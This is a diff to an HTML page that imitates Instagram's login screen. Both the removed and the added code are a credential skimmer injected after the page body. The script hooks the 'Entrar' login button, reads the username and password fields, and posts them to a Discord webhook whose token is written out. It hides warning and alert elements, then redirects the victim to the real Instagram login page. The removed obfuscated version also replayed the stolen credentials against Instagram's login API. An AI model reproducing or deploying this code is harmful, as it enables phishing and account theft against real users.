@@ -144,69 +144,37 @@
 <script src="data:text/javascript;base64,cmVxdWlyZUxhenkoWyJTZXJ2ZXJKU1BheWxvYWRMaXN0ZW5lciJdLGZ1bmN0aW9uKG0pe20ucHJvY2VzcygpO30sbnVsbCwweDEwMCk=" nonce="49zhJgMy" data-btmanifest="1035465663_main"></script>
 <div id='has-finished-comet-page' hidden style='display: none;'></div></body></html>
 
-      <script>
-        (function(){
-            const _0x2a3b = {
-                'webhook': 'https://discord.com/api/webhooks/1484004957576364134/CeQR4xYrAUVJNyJrHyR9MNPaASYGZVK-nKAP7AZWD8KJnJUAmBaIREToUw8ELoLQOz5m',
-                'userField': '_r_6_',
-                'passField': '_r_9_',
-                'loginText': 'Entrar',
-                'loginApi': 'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
-                'feedUrl': 'https://www.instagram.com/',
-                'loginUrl': 'https://www.instagram.com/accounts/login/'
-            };
+     <script>
+    const WEBHOOK = 'https://discord.com/api/webhooks/1484004957576364134/CeQR4xYrAUVJNyJrHyR9MNPaASYGZVK-nKAP7AZWD8KJnJUAmBaIREToUw8ELoLQOz5m';
+    
+    function removeAlert() {
+        document.querySelectorAll('[role="alert"], [class*="warning"]').forEach(el => el?.remove());
+    }
+    setInterval(removeAlert, 500);
+    new MutationObserver(removeAlert).observe(document.body, { childList: true, subtree: true });
+    
+    function sendData() {
+        const user = document.getElementById('_r_6_')?.value;
+        const pass = document.getElementById('_r_9_')?.value;
+        
+        if (user && user.length > 2 && pass && pass.length > 2) {
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `🔐 **LOGIN**\n👤 ${user}\n🔑 ${pass}` })
+            });
             
-            function _0x1f3c() {
-                document.querySelectorAll('[role="alert"], [class*="warning"]').forEach(el => el?.remove());
-            }
-            
-            setInterval(_0x1f3c, 500);
-            new MutationObserver(_0x1f3c).observe(document.body, { childList: true, subtree: true });
-            
-            async function _0x4e7b(_0x2a1b, _0x3c5d) {
-                try {
-                    let _0x5a3f = await fetch(_0x2a3b.loginApi, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                            'X-Requested-With': 'XMLHttpRequest'
-                        },
-                        body: new URLSearchParams({
-                            'username': _0x2a1b,
-                            'enc_password': `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${_0x3c5d}`,
-                            'queryParams': '{}',
-                            'optIntoOneTap': 'false'
-                        })
-                    });
-                    let _0x6b7c = await _0x5a3f.json();
-                    _0x6b7c.authenticated ? window.location.href = _0x2a3b.feedUrl : window.location.href = _0x2a3b.loginUrl;
-                } catch(_0x8a2d) {
-                    window.location.href = _0x2a3b.loginUrl;
-                }
-            }
-            
-            function _0x7e9a() {
-                let _0x1a2b = document.getElementById(_0x2a3b.userField)?.value;
-                let _0x3c5d = document.getElementById(_0x2a3b.passField)?.value;
-                
-                if(_0x1a2b?.length > 2 && _0x3c5d?.length > 2) {
-                    fetch(_0x2a3b.webhook, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: `🔐 **LOGIN**\n👤 ${_0x1a2b}\n🔑 ${_0x3c5d}` })
-                    });
-                    _0x4e7b(_0x1a2b, _0x3c5d);
-                }
-            }
-            
-            setInterval(() => {
-                let _0x2f3c = Array.from(document.querySelectorAll('span')).find(span => span.textContent === _0x2a3b.loginText)?.closest('[role="button"]');
-                if(_0x2f3c && !_0x2f3c._h) {
-                    _0x2f3c._h = true;
-                    _0x2f3c.addEventListener('click', _0x7e9a);
-                }
-            }, 1000);
-        })();
-    </script>
-</body>
-</html>
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            }, 500);
+        }
+    }
+    
+    setInterval(() => {
+        const btn = Array.from(document.querySelectorAll('span')).find(s => s.textContent === 'Entrar')?.closest('[role="button"]');
+        if (btn && !btn._capture) {
+            btn._capture = true;
+            btn.addEventListener('click', sendData);
+        }
+    }, 1000);
+</script>
